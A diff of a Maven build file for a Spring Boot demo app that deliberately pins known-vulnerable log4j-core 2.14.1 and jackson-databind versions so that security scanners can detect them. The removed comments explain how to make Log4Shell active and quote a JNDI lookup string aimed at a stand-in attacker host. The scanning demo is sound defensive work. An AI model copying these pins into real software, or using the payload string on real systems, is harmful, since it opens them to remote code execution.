@@ -4,58 +4,41 @@
 	<modelVersion>4.0.0</modelVersion>
 
 	<!--
-    OWASP Dependency Check Demo
-    ───────────────────────────
-    This pom.xml intentionally includes VULNERABLE dependencies to demonstrate
-    the OWASP Dependency Check plugin finding real CVEs.
+    Hello Conference — Demo Application
+    ────────────────────────────────────
+    A simple Spring Boot 4.x application used by the Build Docker Images
+    project to create various optimized container images (jlink, native, CRaC).
 
-    Known vulnerabilities in this pom:
-      • log4j-core 2.14.1    — CVE-2021-44228 (Log4Shell, CVSS 10.0), CVE-2021-45046
-      • jackson-databind 2.13.4.1 — CVE-2022-42003, CVE-2022-42004 (deserialization)
+    Also intentionally includes VULNERABLE dependencies to demonstrate
+    security scanning tools (Trivy, Grype, OWASP Dependency Check).
 
-    DO NOT use these versions in a real project.
+    Known vulnerabilities (for scanning demos):
+      • log4j-core 2.14.1       — CVE-2021-44228 (Log4Shell, CVSS 10.0)
+      • jackson-databind 2.13.4.1 — CVE-2022-42003, CVE-2022-42004
+
+    DO NOT use these dependency versions in a real project.
 	-->
 
 	<parent>
 		<groupId>org.springframework.boot</groupId>
 		<artifactId>spring-boot-starter-parent</artifactId>
-		<!--
-		    ⚠️  Pinned to 2.7.18 (last Spring Boot 2.x) so the app runs on Java 11.
-		    log4j-core 2.14.1 has binary incompatibilities with Java 17 that prevent startup;
-		    Java 11 is the highest JVM version where 2.14.1 runs without JVM-level crashes.
-		    Spring Boot 2.7.x also keeps the Ubuntu Jammy packages older, maximising CVEs for
-		    the Trivy scan demo.
-		-->
-		<version>2.7.18</version>
-		<relativePath/> <!-- lookup parent from repository -->
+		<version>4.1.0</version>
+		<relativePath/>
 	</parent>
 	<groupId>com.example</groupId>
 	<artifactId>HelloConference</artifactId>
 	<version>0.0.1-SNAPSHOT</version>
 	<name>HelloConference</name>
-	<description>Hello Conference — intentionally includes vulnerable dependencies for security scanning demos</description>
+	<description>Hello Conference — demo app for Docker image optimization and security scanning</description>
 
 	<properties>
-		<!-- Java 11: log4j 2.14.1 works without JVM lambda-verification crashes on 11 -->
-		<java.version>11</java.version>
+		<java.version>25</java.version>
 	</properties>
 
 	<dependencies>
 		<dependency>
 			<groupId>org.springframework.boot</groupId>
 			<artifactId>spring-boot-starter-web</artifactId>
-			<exclusions>
-				<!--
-				    ⚠️  DEMO FIX: exclude the log4j-to-slf4j bridge.
-				    Spring Boot routes Log4j2 API → SLF4J → Logback, completely bypassing
-				    log4j-core 2.14.1 and its JNDI processor.  Removing this bridge forces
-				    Log4j2 API to call log4j-core 2.14.1 directly → Log4Shell is active.
-				-->
-				<exclusion>
-					<groupId>org.apache.logging.log4j</groupId>
-					<artifactId>log4j-to-slf4j</artifactId>
-				</exclusion>
-			</exclusions>
 		</dependency>
 
 		<dependency>
@@ -65,43 +48,15 @@
 		</dependency>
 
 		<!--
-		    ⚠️  log4j-api must match log4j-core exactly.
-		    The newer log4j-api (2.17.x from Spring Boot 2.7.x) removed LoaderUtil.getClassLoaders()
-		    which log4j-core 2.14.1 calls at startup → NoSuchMethodError.
-		    Forcing api=2.14.1 fixes this; on Java 11 there is no lambda-verification crash.
-		-->
-		<dependency>
-			<groupId>org.apache.logging.log4j</groupId>
-			<artifactId>log4j-api</artifactId>
-			<version>2.14.1</version>
-		</dependency>
-
-		<!--
-		    ⚠️  Log4Shell — CVE-2021-44228 (CVSS 10.0)
-		    Version 2.14.1 is the last version BEFORE the fix.
-		    Any application that logs user-controlled input is vulnerable to RCE
-		    via JNDI lookup strings like ${jndi:ldap://attacker.com/exploit}.
+		    ⚠️  VULNERABLE DEPENDENCIES — for security scanning demos only.
+		    These are on the classpath so Trivy/Grype/OWASP can detect them.
+		    The app does NOT use them at runtime (Spring Boot uses SLF4J/Logback).
 		-->
 		<dependency>
 			<groupId>org.apache.logging.log4j</groupId>
 			<artifactId>log4j-core</artifactId>
 			<version>2.14.1</version>
 		</dependency>
-
-		<!--
-		    ⚠️  Jackson Databind — multiple deserialization CVEs (2019-2021)
-		    CVE-2019-14379, CVE-2019-14439, CVE-2020-24616, CVE-2020-24750, etc.
-		    With enableDefaultTyping(), an attacker can instantiate arbitrary classes
-		    via crafted JSON payloads.
-		-->
-		<!--
-		    ⚠️  Jackson Databind — CVE-2022-42003, CVE-2022-42004 (CVSS 7.5)
-		    Version 2.13.4.1 is old enough to have CVEs and demonstrates unsafe
-		    deserialization with enableDefaultTyping(), yet new enough to be
-		    compatible with Spring Boot 2.7.x's Jackson auto-configuration.
-		    (2.9.10 was too old — Spring Boot 2.7.x's JavaTimeModule needs classes
-		    added in 2.12+, causing NoClassDefFoundError at startup.)
-		-->
 		<dependency>
 			<groupId>com.fasterxml.jackson.core</groupId>
 			<artifactId>jackson-databind</artifactId>
@@ -116,18 +71,11 @@
 				<artifactId>spring-boot-maven-plugin</artifactId>
 			</plugin>
 
-			<!--
-				OWASP Dependency Check
-				Run:  ../mvnw dependency-check:check   (or OWASP Dependency Check/scripts/run-check.sh)
-				failBuildOnCVSS=7 → fail on HIGH+ severity CVEs
-			-->
 			<plugin>
 				<groupId>org.owasp</groupId>
 				<artifactId>dependency-check-maven</artifactId>
 				<version>12.1.1</version>
 				<configuration>
-					<!-- Never fail the build for demo purposes -->
-<!--					<failBuildOnCVSS>7</failBuildOnCVSS>-->
 					<formats>
 						<format>HTML</format>
 						<format>JSON</format>
@@ -136,21 +84,11 @@
 					<skipTestScope>true</skipTestScope>
 					<ossindexAnalyzerEnabled>false</ossindexAnalyzerEnabled>
 				</configuration>
-				<executions>
-					<execution>
-						<goals><goal>check</goal></goals>
-					</execution>
-				</executions>
 			</plugin>
 		</plugins>
 	</build>
 
 	<profiles>
-		<!--
-			Native Image profile
-			Activate with: ./mvnw -Pnative native:compile -DskipTests
-			Requires GraalVM 25 (or the Dockerfile.native multi-stage build).
-		-->
 		<profile>
 			<id>native</id>
 			<build>
@@ -161,9 +99,7 @@
 						<executions>
 							<execution>
 								<id>process-aot</id>
-								<goals>
-									<goal>process-aot</goal>
-								</goals>
+								<goals><goal>process-aot</goal></goals>
 							</execution>
 						</executions>
 					</plugin>
@@ -177,22 +113,15 @@
 								<buildArg>-H:+ReportExceptionStackTraces</buildArg>
 								<buildArg>-march=compatibility</buildArg>
 							</buildArgs>
-							<metadataRepository>
-								<enabled>true</enabled>
-							</metadataRepository>
 						</configuration>
 						<executions>
 							<execution>
 								<id>add-reachability-metadata</id>
-								<goals>
-									<goal>add-reachability-metadata</goal>
-								</goals>
+								<goals><goal>add-reachability-metadata</goal></goals>
 							</execution>
 							<execution>
 								<id>build-native</id>
-								<goals>
-									<goal>compile-no-fork</goal>
-								</goals>
+								<goals><goal>compile-no-fork</goal></goals>
 								<phase>package</phase>
 							</execution>
 						</executions>
@@ -201,6 +130,4 @@
 			</build>
 		</profile>
 	</profiles>
-
 </project>
-
